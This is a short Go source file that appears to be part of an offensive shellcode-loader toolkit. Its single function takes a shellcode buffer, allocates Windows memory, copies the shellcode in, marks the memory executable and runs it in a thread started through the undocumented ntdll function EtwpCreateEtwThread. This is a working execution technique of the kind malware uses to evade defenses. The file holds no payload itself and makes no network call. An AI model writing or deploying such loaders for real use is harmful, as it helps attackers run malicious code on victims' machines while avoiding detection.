package core

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

func EtwpCreateEtwThread(shellcode []byte) error {

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	EtwpCreateEtwThread := ntdll.NewProc("EtwpCreateEtwThread")

	addr, _, err := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if addr == 0 {
		return err
	}

	RtlCopyMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	oldProtect := windows.PAGE_READWRITE
	VirtualProtect.Call(
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	thread, _, err := EtwpCreateEtwThread.Call(
		addr,
		uintptr(0),
	)
	if thread == 0 {
		return err
	}

	r, _, err := WaitForSingleObject.Call(
		thread,
		0xFFFFFFFF,
	)
	if r != 0 {
		return err
	}

	return nil
}
